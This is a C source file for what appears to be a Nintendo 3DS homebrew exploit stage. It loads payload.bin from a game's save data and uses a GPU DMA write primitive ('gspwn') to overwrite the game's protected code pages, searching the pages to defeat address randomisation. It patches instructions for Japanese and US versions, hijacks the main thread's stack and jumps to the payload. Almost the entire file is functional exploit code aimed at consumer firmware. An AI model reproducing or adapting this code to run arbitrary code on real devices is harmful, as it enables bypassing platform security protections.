#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>

#include "imports.h"

#define LINEAR_BUFFER ((u8*)0x31000000)
#define OTHERAPP_PAYLOAD_LOADADR (0x00101000)

Result gspwn(void* dst, void* src, u32 size)
{
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32) src, //source address
		(u32) dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	return _GSPGPU_GxTryEnqueue(sharedGspCmdBuf, gxCommand);
}

Result _GSPGPU_SetBufferSwap(Handle handle, u32 screenid, GSP_FramebufferInfo framebufinfo)
{
	Result ret=0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x00050200;
	cmdbuf[1] = screenid;
	memcpy(&cmdbuf[2], &framebufinfo, sizeof(GSP_FramebufferInfo));
	
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

vu32 synchronizer = 0;

void _main()
{
	synchronizer = 1;

	while(synchronizer == 1) svc_sleepThread(1 * 1000 * 1000);

	Handle fileHandle = 0x0;
	Result ret = 0x0;

	u32 decompressed_size = 0x0;
	u8* decompressed_buffer = LINEAR_BUFFER;

	// load payload.bin from savegame
	ret = _FSUSER_OpenFileDirectly(fsHandle, &fileHandle, 0x0, 0x00000009, PATH_EMPTY, "", 1, PATH_CHAR, "/payload.bin", 13, 0x1, 0x0);
	if(ret) *(u32*)ret = 0xdead0001;

	ret = _FSUSER_ReadFile(&fileHandle, &decompressed_size, 0x0, decompressed_buffer, 0xC000);
	if(ret) *(u32*)ret = 0xdead0002;

	ret = _FSUSER_CloseFile(&fileHandle);
	if(ret) *(u32*)ret = 0xdead0003;

	// copy payload to text
	ret = _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)decompressed_buffer, decompressed_size);

	// in order to bypass paslr we have to search for individual pages to overwrite...
	int i, j;
	int k = 0;
	for(i = 0; i < MCOPY_CODEBIN_SIZE && k < decompressed_size; i += 0x1000)
	{
		for(j = 0; j < decompressed_size; j += 0x1000)
		{
			if(!memcmp((void*)(MCOPY_RANDCODEBIN_COPY_BASE + i), (void*)(OTHERAPP_PAYLOAD_LOADADR + j), 0x20))
			{
				ret = gspwn((void*)(MCOPY_RANDCODEBIN_BASE + i), &decompressed_buffer[j], 0x1000);
				svc_sleepThread(10 * 1000 * 1000);
				k += 0x1000;
				break;
			}
		}
	}

	for(i = 0; i < MCOPY_CODEBIN_SIZE; i += 0x1000)
	{
		if(!memcmp((void*)(MCOPY_RANDCODEBIN_COPY_BASE + i), (void*)(0x00168000), 0x20))
		{
			*(u32*)(MCOPY_RANDCODEBIN_COPY_BASE + i + 0xAC8) = 0xef000009; // JPN
			*(u32*)(MCOPY_RANDCODEBIN_COPY_BASE + i + 0x91C) = 0xef000009; // USA
			ret = _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)(MCOPY_RANDCODEBIN_COPY_BASE + i), 0x1000);
			ret = gspwn((void*)(MCOPY_RANDCODEBIN_BASE + i), (void*)(MCOPY_RANDCODEBIN_COPY_BASE + i), 0x1000);
			svc_sleepThread(10 * 1000 * 1000);
			k += 0x1000;
			break;
		}
	}

	// ghetto dcache invalidation
	// don't judge me
	for(j = 0; j < 0x4; j++)
		for(i = 0; i < 0x01000000 / 0x4; i += 0x20)
			LINEAR_BUFFER[i + j] ^= 0xDEADBABE;

	// put framebuffers in linear mem so they're writable
	u8* top_framebuffer = &LINEAR_BUFFER[0x00100000];
	u8* low_framebuffer = &top_framebuffer[0x00046500];
	_GSPGPU_SetBufferSwap(*gspHandle, 0, (GSP_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
	_GSPGPU_SetBufferSwap(*gspHandle, 1, (GSP_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	// un-init DSP so killing Ironfall will work
	_DSP_UnloadComponent(dspHandle);
	_DSP_RegisterInterruptEvents(dspHandle, 0x0, 0x2, 0x2);

	// run payload
	{
		void (*payload)(u32* paramlk, u32* stack_pointer) = (void*)OTHERAPP_PAYLOAD_LOADADR;
		u32* paramblk = (u32*)LINEAR_BUFFER;

		paramblk[0x1c >> 2] = MCOPY_GSPGPU_GXCMD4;
		paramblk[0x20 >> 2] = MCOPY_GSPGPU_FLUSHDATACACHE_WRAPPER;
		paramblk[0x48 >> 2] = 0x8d; // flags
		paramblk[0x58 >> 2] = MCOPY_GSPGPU_HANDLE;
		paramblk[0x64 >> 2] = 0x08010000;

		payload(paramblk, (u32*)(0x10000000 - 4));
	}

	*(u32*)ret = 0xdead0008;
}

void _takeover()
{
	// takeover the main thread rather than keep using this shitty one
	int i;
	for(i = 0; i < 0x4000; i += 4)
	{
		*(u32*)(0x10000000 - 4 - i) = (u32)_main;
	}

	while(!synchronizer) svc_sleepThread(1 * 1000 * 1000);

	synchronizer = 2;

	svc_exitThread();
}
